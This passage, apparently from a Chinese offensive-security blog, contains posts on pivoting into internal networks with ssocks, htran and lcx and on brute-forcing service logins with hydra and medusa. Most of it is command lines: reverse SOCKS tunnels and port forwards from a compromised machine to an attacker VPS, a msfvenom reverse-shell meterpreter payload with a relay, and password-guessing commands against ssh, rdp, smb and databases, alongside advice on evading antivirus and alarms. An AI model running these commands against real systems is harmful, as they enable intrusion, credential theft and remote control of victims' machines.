+<p>0x04 再回到自己本地通过各种socks代理工具,连到vps的socks代理的端口上,即可轻松访问目标内网中的资源<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">proxychains</div><div class="line">proxifier</div><div class="line">putty</div></pre></td></tr></table></figure></p>
+<p><img src="/img/sscosk_proxifier.png" alt=""><br><img src="/img/sscosk_proxifier_ssh.png" alt=""><br><img src="/img/sscosk_proxifier_res.png" alt=""></p>
+<p>0x05 从连接信息中我们看到了socks连接建立成功的提示,如下<br><img src="/img/sscosk_proxifier_res_1.png" alt=""><br><img src="/img/sscosk_proxifier_res_2.png" alt=""></p>
+<p><br><br>在win中使用ssocks:</p>
+<p>0x01 本地机器上执行,一般都是自己的vps,如果开了防火墙记得把该端口放开:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rcsocks.exe -l 1234 -p 1080 -vv</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sscosk_win_rcsocks.png" alt=""></p>
+<p>0x02 到目标机器上执行[自带台运行选项,实际渗透中可以把它加上]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rssocks.exe -s  192.168.3.41(实际中可能是你vps的ip):1080 -vv</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sscosk_win_rssocks.png" alt=""></p>
+<p>0x03 依然是回到自己本地通过各种socks代理工具,连到vps的socks代理的端口上,而后正常的访问目标内网资源即可<br><img src="/img/sscosk_win_proxifier.png" alt=""><br><img src="/img/sscosk_win_proxifier_rule.png" alt=""><br><img src="/img/sscosk_win_proxifier_res.png" alt=""><br><br></p>
+<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这也是实际渗透过程个人比较推荐的内网代理方式,尤其当目标机器存在公网ip的时候,用这种方式进行内网渗透无疑是极好的,此工具基本是没有任何依赖,使用简单粗暴,相对来说也比较轻量,免杀就更不用说了[因为根本就不需要免杀],除此之外,还有很多其它优点,这里就不一一说了,大家自己多实践就会感受到了<br><br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/10/htran-portforward/">
+                通向彼岸 之内网代理转发 [ htran篇 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-10</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/port-forward/">port forward</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>htran 另一款要比lcx好用很多的端口转发及socks代理工具</p>
+<p>1)首先,是最常规的端口转发功能:</p>
+<p>0x01 首先,到vps上监听好指定的端口,意思是把本地的443端口流量转到本地的1234端口上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># htran -p -listen 443 1234</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_listen_win.png" alt=""></p>
+<p>0x02 然后,回到目标机器上执行,意思就是把肉鸡的3389端口的流量转到vps的443端口上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># htran -p -slave 192.168.3.251[实际测试中应该是自己vps的ip] 443 192.168.32.134 3389</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_slave_win.png" alt=""></p>
+<p>0x03 最后,再回到vps本地用指定的工具连接到最开始转出到的1234端口上,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">mstsc:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">1234</span></div><div class="line"><span class="symbol">putty:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">1234</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_listen_win_1.png" alt=""><br><img src="/img/htran_listen_win_2.png" alt=""></p>
+<p>2)其次,是相对比较实用的socks代理功能,让目标机器作为socks代理端,对目标内网进行渗透,不过这可能需要目标机器有个固定的公网ip,不然怎么练上去呢:</p>
+<p>0x01 先在目标机器上安装并启动socks5服务<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -install</span></div><div class="line"><span class="comment"># HTran2.4.exe -start</span></div><div class="line"><span class="comment"># htran -remove  不用时,卸掉即可</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_socks_install_start.png" alt=""></p>
+<p>0x02 然后,回到自己的vps上先监听好等会要连回来的端口,这里的-s才表示的是启用socks代理,而-p单单只是进行口转发<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -s -listen 1080 1234</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_socks_listen.png" alt=""></p>
+<p>0x03 上面都准备好以后,此时再回到目标机器上,开始和vps建立socks连接,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -s -connect 192.168.3.251[实际测试中应该是自己vps的ip] 1080</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/htran_socks_connect.png" alt=""></p>
+<p>0x04 连接建立后,我们现在就可以回到我们自己本地的渗透系统中,安装好socskcap代理工具 [当然,你用别的socks客户端也一样],然后再工具设置中填写好vps的ip和socks代理的端口 [这里是1234这个端口],不过,要注意,如果你的vps开了防火墙,务必记得把这几个代理用到的端口都放开,要不然,数据是过不来的<br><img src="/img/htran_socks_sockcap.png" alt=""></p>
+<p>0x05 最后,再把自己常用的一些内网渗透工具加到sockscap中,就可以对目标进行正常的内网渗透了,效果如下<br><img src="/img/htran_socks_sockcap_res.png" alt=""><br><img src="/img/htran_socks_sockcap_rdp.png" alt=""></p>
+<p><br><br>关于htran:<br>&nbsp;&nbsp;&nbsp;&nbsp;可能唯一的缺点还是需要免杀,工具也相对比较老了,2.4的源码应该早就放出来了,有兴趣可以down下来仔细分析下,个人觉得在实际测试中,它比lcx稍稳定一些,速度也还可以,确实是个很贴心的小工具<br><br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/09/lcx-porforward/">
+                通向彼岸 之内网代理转发 [ lcx篇 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-09</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/port-forward/">port forward</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>linux,win 平台下都有相应的已经编译好的版本,后期我会把自己用的工具都打包提供给大家,原理想必大家早已经非常清楚,其实本来就非常简单,所以这里就不废话了,简单使用如下</p>
+<p>0x01 把来自外部的某个端口上的流量转到本地的某个端口上</p>
+<p>首先,在自己的vps上执行监听准备:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -listen 监听来自外部的某个端口上的流量 转发到指定的本地端口上</span></div><div class="line"><span class="comment"># lcx -listen 443 1234  把来自外部的443端口的流量转到本地的1234端口上</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/lcx_listen_win.png" alt=""></p>
+<p>而后,回到目标机器上去执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -slave 公网vps的ip  在vps上监听的端口  目标机器的ip 目标机器上指定的端口[通常是远程桌面或者ssh]</span></div><div class="line"><span class="comment"># lcx -slave 103.*.*.* 443 192.168.3.23 3389  把目标机器的3389端口的流量转发到自己vps的443端口上</span></div><div class="line"><span class="comment"># lcx -slave 103.*.*.* 443 192.168.3.23 22    把目标机器的22端口的流量转发到自己vps的443端口上</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/lcx_listen_win_slave.png" alt=""></p>
+<p>最后,再回到自己的vps上,看到连接正常建立,就可以用指定工具连接到目标机器上了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">mstsc:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">1234</span>  连目标的远程桌面</div><div class="line"><span class="symbol">putty:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">1234</span>  连目标的ssh</div></pre></td></tr></table></figure></p>
+<p>此时当你在本地访问 127.0.0.1 的1234端口其实就相当于访问目标机器的rdp[3389端口]或者ssh[22端口]<br><img src="/img/lcx_listen_win_slave_res.png" alt=""></p>
+<p>关于lcx在linux中的用法,大同小异,只是参数不同而已,如下:</p>
+<p>先在自己的vps上执行</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ./lcx -m 2 -p1 443 -h2 192.168.3.41[实际中可能是你vps的地址] -p2 1234  首先,还是在自己的vps上执行监听</span></div></pre></td></tr></table></figure>
+<p><img src="/img/lcx_linux_1.png" alt=""></p>
+<p>而后回到目标机器上执行</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ./lcx -m 3 -h1 192.168.3.40[目标机器的ip] -p1 22 -h2 192.168.3.41[vps的ip] -p2 443 到目标机器上执行,把目标机器的22端口转到vps的443端口上</span></div></pre></td></tr></table></figure>
+<p><img src="/img/lcx_linux_2.png" alt=""></p>
+<p>最后,再回到自己的vps上执行</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh root@127.0.0.1 -p 1234 观察到连接正常建立后,在vps上连接本地的1234端口实际连的就是目标机器[192.168.3.40]的22端口,效果如下</span></div></pre></td></tr></table></figure>
+<p><img src="/img/lcx_linux_3.png" alt=""><br><img src="/img/lcx_linux_4.png" alt=""></p>
+<p>0x02 把来自外部的某个端口上的流量转到指定的其它机器的某个端口上,典型应用场景,<code>把来自公网的meterpreter直接通过vps转到本地的msf中</code>,流程大致如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -tran 来自外部的端口 指定机器的ip 指定机器上的端口</span></div></pre></td></tr></table></figure></p>
+<p>1),先把本地的kali连到vpn内网中[我是直接用自己的vps搭的vpn],因为等会儿要走vpn内网做转发,所以必须先连到vpn内网中,这是第一个比较关键的地方<br><img src="/img/forien_meter.png" alt=""></p>
+<p>此时再回到vps上ping下kali所在的vpn内网ip,确认kali和vps之间通过vpn内网通信没有任何问题<br><img src="/img/forien_meter_1.png" alt=""></p>
+<p>2),然后,回到本地的kali中开始生成payload,注意这里payload回连的ip要写自己vps的公网ip<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=*.*.*.*[payload的回连ip要设成vps的] LPORT=8080 -f exe -o /root/Desktop/shell.exe</span></div></pre></td></tr></table></figure></p>
+<p>3),payload生成好以后,就可以开始监听了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set lhost <span class="number">172.16</span>.<span class="number">12.1</span>(本机的vpn内网ip) </div><div class="line">msf exploit(handler) &gt; set lport <span class="number">8080</span></div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure></p>
+<p>4),第二个关键的地方,到vps上去做下转发,意思是把来自外部的8080[其实是我们自己的payload的回连端口]端口的流量通过vpn内网转到kali的8080端口上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -tran 8080 172.16.12.1 8080</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/forien_meter_3.png" alt=""></p>
+<p>5),最后,把payload丢到目标上去执行,meterpreter被正常从公网弹回,稍微留意下这里的上线ip就知道,很显然,是通过vpn的内网ip过来的<br><img src="/img/forien_meter_4.png" alt=""></p>
+<p><br><br>关于lcx:<br>&nbsp;&nbsp;&nbsp;&nbsp;需要免杀,对于简单的内网还能凑活,对于现在的一些场景已经不能很好的适用了,个人在实际内网渗透过程中基本用的不多 [基本就是用来转下meterpreter和beef什么的],都是些简单辅助性的用途,工具也确实已经有些年头了,工具源码网上也到处都是,有兴趣可以仔细研读下[如果想自己过免杀的话],现在已经有很多更好的替代品,不过,这里还是感谢前辈们,在那个时代留给我们的财富<br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/08/18/service-brute-force/">
+                永不消失的 '0day' [ 弱口令 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-18</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/service-brute-force/">service brute force</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>0x01 hydra 选项用途简要说明</p>
+<p>这里暂以linux平台使用为例,实际测试中也推荐大家在linux平台上自己编译,不然有些服务模块可能不太好使,虽然已经有编译好的win版本,但不太建议实际用,如果真没办法非要在win上跑,建议大家还是用7.x之前的版本吧,新版本中确实还有很多问题<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">-R	从上次未完成的爆破文件[hydra.restore]中读取爆破进度并接着上次的进度继续往后爆破</div><div class="line">-S 	爆破https时需要加上该选项</div><div class="line">-s 	如果要爆破的服务用的不是默认端口,可以用这个来手工指定服务端口号</div><div class="line">-l/-L 	指定用户名 / 指定用户名字典文件</div><div class="line">-p/-P 	指定密码 / 指定密码字典文件[字典务必要自己精心准备,别人的始终不适合自己的环境]</div><div class="line">-e 	尝试空密码[n]/尝试将用户名作为密码[s]/尝试将用户名和密码位置调换爆破[r]</div><div class="line">-f/-F 	当爆出第一个正确的密码后,就自动退出程序,-f表示单个<span class="string">'进程'</span>退出,-F表示全局退出</div><div class="line">-t 	指定爆破进程,实际爆破中给<span class="number">8</span>个左右即可,太高了容易报警,速度慢不怕,就怕动静儿太大,这里只是个参考,如果目标内网环境相对比较松,可以适当再放大一点,当然,肯定不能无限大,基于目标系统而定,大家酌情使用吧</div><div class="line">-w 	设定超时时长,默认<span class="number">32</span>秒,一般情况<span class="number">10</span>秒即可</div><div class="line">-<span class="number">4</span>/-<span class="number">6</span> 	<span class="number">4</span>表示用ipv4,<span class="number">6</span>表示用ipv6</div><div class="line">-v 	显示爆破信息</div><div class="line">-M 	把要爆破的目标都写到一个文件中,每行对应一个目标,支持域名,CIDR格式,或者单个ip的形式</div></pre></td></tr></table></figure></p>
+<p>0x02 在linux中编译安装hydra,此处暂以centos6.8 x64为例:</p>
+<p>务必事先安装好所需的各种依赖库,因为hydra在破解各种服务的时候,可能会用到各类服务自己devel库中的一些函数,也就意味着你可能要装很多个库,因为它本身就支持很多服务的在线爆破,其实,就这一点来说,hydra本身做的事情并不算多,因为大多都要依赖别的库函数来实现,这样来看的话,hydra本质上只是把各种服务整合了一下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -zxf libssh-0.4.8.tar.gz</span></div><div class="line"><span class="comment"># cd libssh-0.4.8</span></div><div class="line"><span class="comment"># mkdir build</span></div><div class="line"><span class="comment"># cd build/</span></div><div class="line"><span class="comment"># cmake -DCMAKE_INSTALL_PREFIX=/usr -DCMAKE_BUILD_TYPE=Debug -DWITH_SSH1=ON ..</span></div><div class="line"><span class="comment"># make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div><div class="line"><span class="comment"># /sbin/ldconfig</span></div></pre></td></tr></table></figure></p>
+<p>0x03 安装 hydra 的各种依赖库</p>
+<p>下面中的有一些库,有可能在你的环境中直接用yum装不上,没办法了,只能你自己稍微勤快点,去谷歌上找找,然后再单独手工把它装上,放心,肯定能找到解决办法的,如果中间有库装不上,可能在编译hydra时确实是可以编译成功,但等到后期实际爆破某些服务的时候就会出现各种问题<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum groupinstall "Development Tools"</span></div><div class="line"><span class="comment"># yum install openssl-devel pcre-devel ncurses-devel ncurses postgresql-devel libssh-devel subversion-devel gcc cmake mysql-devel subversion-devel ncpfs-devel postgresql-devel  libncurses-devel libidn-devel libpqxx-devel apr-devel apr-util-devel  firebird-devel afpfs-ng-devel</span></div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure></p>
+<p>0x04 编译安装hydra<br>可以看到就hydra 本身的编译安装过程倒是非常简单,你也可以用–prefix指定安装目录,走的时候方便顺手把整个安装目录干掉即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -zxf hydra-8.0.tar.gz</span></div><div class="line"><span class="comment"># cd hydra-8.0</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="comment"># hydra -h</span></div></pre></td></tr></table></figure></p>
+<p>0x05 针对各类服务的实例爆破演示:</p>
+<p>爆破mssql [大多可能都是直接针对sa,想快速getshell,实际测试速度和精度都还不错]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 mssql://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_mssql_sa.jpg" alt="hydra brute force"></p>
+<p>爆破smb [速度还是比较快的,针对普通域内网的效果可能会好点]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 smb://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_smb.jpg" alt="hydra brute force"></p>
+<p>爆破rlogin [该服务用的可能已经不太多了]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra  -L user.txt -P pass.txt -f -v rlogin://192.168.3.161</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_rlogin.jpg" alt="hydra brute force"></p>
+<p>爆破mysql [可能主要也是针对root,如果目标有waf,可能就不太好使了,过多的数据库连接容易触发报警,如果目标是linux,爆破速度还是蛮快的]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -l root -P pass.txt -f -v -t 20 mysql://192.168.3.13</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_mysql.jpg" alt="hydra brute force"></p>
+<p>爆破postgresql [实际测试中,速度还是蛮快的咧]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 postgres://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_pgsql.jpg" alt="hydra brute force"></p>
+<p>爆破rdp [ 对于08以上的系统基本就是个废,在本地多次测试均未成功,不过对于03以下的机器目前暂时还是比较可行的]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 rdp://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_rdp.jpg" alt="hydra brute force"></p>
+<p>爆破ssh [正常情况下的速度还可以,前面装libssh就是为了爆破它的]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -l root -P pass.txt -f -v -t 20 ssh://192.168.3.160</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_ssh.jpg" alt="hydra brute force"></p>
+<p>爆破smtp[需要带目标域名后缀,所有的邮箱破解类的实际测试中都不太稳定[怀疑是某些防护的原因],偶尔能跑出来,偶尔又跑不出来,不太建议实战中用]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -v -f -t 20 smtp://192.168.3.160</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_smtp.jpg" alt="hydra brute force"><br></p>
+<p>爆破pop3[不需要域名后缀,只需正确的账号密码即可,同样,很不稳定,有兴趣,可以拿常用公共邮箱测测精度,如:gmail,outlook,126,163,sina,qq…]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -v -f -t 20 smtp://192.168.3.160</span></div></pre></td></tr></table></figure></p>
+<p>爆破ftp [还算靠谱,不过需要前期好好搜集下目标的用户名]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 ftp://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_ftp.jpg" alt="hydra brute force"></p>
+<p>爆破telnet [靠谱]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 telnet://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_telnet.jpg" alt="hydra brute force"></p>
+<p>爆破vnc [无须用户名,本地多次测试都未成功]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra  -P pass.txt -f -v -t 20 vnc://192.168.3.23</span></div></pre></td></tr></table></figure></p>
+<p>爆破snmp [暂时还好使]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra  -P pass.txt -f -v -t 20 snmp://192.168.3.160</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/hydra_snmp.jpg" alt="hydra brute force"><br></p>
+<p>爆破svn [实际中多次测试均未跑出来]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 svn://192.168.3.13</span></div></pre></td></tr></table></figure></p>
+<p>爆破ldap2/3(同样跑不出来):<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hydra -L user.txt -P pass.txt -f -v -t 20 ldap2://192.168.3.161</span></div></pre></td></tr></table></figure></p>
+<p>爆破redis:<br><br><br></p>
+<p>hydra 使用小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;支持的服务比较多,这里就不一一演示了,大家可根据实际情况针对性的用,就个人使用来讲,hydra精度真的很一般 [尤其是在爆破各类邮件服务时,比如,pop3,smtp[这个还好点儿] ,imap,时好时坏,极不稳定,原因暂未找],速度也极为一般,单单就稳定性来讲,不是很靠谱,不过这里仅供参考,建议大家还是根据自己的实际情况来,一面之词,不足为信,大家可以自己实际使用为准<br><br><br></p>
+<p>0x05 使用 medusa </p>
+<p>偶尔会断,原因暂未查,不过,如果是实际爆破,相对来讲,个人还是比较推荐这个,尤其当拿下的目标机器是linux时,虽然,它支持的服务可能并没有hydra那么多,但个人还是比较喜欢它 [稳定,精度较高],毕竟是帮忙搞了不少事情,不幸的是,它没有win版,作者说它自己用Cygwin始终都没编译成功,如果你编译成功了,请立马告诉他,他也许还会请你喝杯啤酒啥的,嘿嘿……</p>
+<p>支持爆破的服务模块,在kali中的默认路径如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/lib/medusa/modules</div></pre></td></tr></table></figure></p>
+<p>自己编译后的默认服务模块路径,默认如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/local/lib/medusa/modules</div></pre></td></tr></table></figure></p>
+<p>关于不同系统平台所要安装的一些依赖库,在工具官方站点中已有详细说明,链接如下,请自行查看<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/foofus.net/goons</span><span class="regexp">/jmk/medusa</span><span class="regexp">/medusa.html</span></div></pre></td></tr></table></figure></p>
+<p>编译安装medusa和hydra几乎没什么区别,非常简单[此处同样是以centos6.8 x64为例]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum groupinstall "Development Tools"</span></div><div class="line"><span class="comment"># yum install openssl-devel libssh2-devel postgresql-devel subversion-devel freerdp-devel</span></div><div class="line"><span class="comment"># tar -zxf medusa-2.2.tar.gz</span></div><div class="line"><span class="comment"># cd medusa-2.2</span></div><div class="line"><span class="comment"># vi INSTALL</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div><div class="line"><span class="comment"># medusa -h</span></div></pre></td></tr></table></figure></p>
+<p>0x06 常用选项功能说明,跟hydra选项用法基本一致,看看命令帮助就知道了,这儿不再细说:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">-h 	指定目标ip或者域名</div><div class="line">-H 	要爆破多个目标时,可以统一把他们先放到一个文件中,用该选项指定即可,每个目标对应单独的一行</div><div class="line">-u/-U 	指定用户名或者包含用户名的字典</div><div class="line">-p/-P 	指定单个密码或者包含密码的字典[务必精心准备]</div><div class="line">-e n/s	跟hydra一样,尝试空密码,把用户名当密码尝试,</div><div class="line">-M 	指定要爆破的服务模块,比如是medusa支持的服务才可以,至于具体支持那些服务,看前面的模块目录即可知</div><div class="line">-n 	如果服务不是默认的端口,用该选项手工指定端口号</div><div class="line">-s 	启用ssl</div><div class="line">-f 	在爆出第一个密码之后就退出该程序</div><div class="line">-v 	显示爆破详情</div></pre></td></tr></table></figure></p>
+<p>0x07 下面是针对各类服务的一些实例爆破演示</p>
+<p>爆破mssql [同样是只针对sa]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -U user.txt -P pass.txt -f -M mssql</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_mssql.png" alt="mesua brute force"></p>
+<p>爆破mysql [针对root用户]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.13 -U user.txt -P pass.txt -f -M mysql</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_mysql.png" alt="mesua brute force"></p>
+<p>爆破smb [倒是很麻利]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -U user.txt -P pass.txt -f -M smbnt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_smbnt.png" alt="mesua brute force"></p>
+<p>爆破postgresql [速度非常快]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># medusa -h 192.168.3.23 -U user.txt -P pass.txt -f -M postgres</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/medusa_pgsql.jpg" alt="mesua brute force"></p>
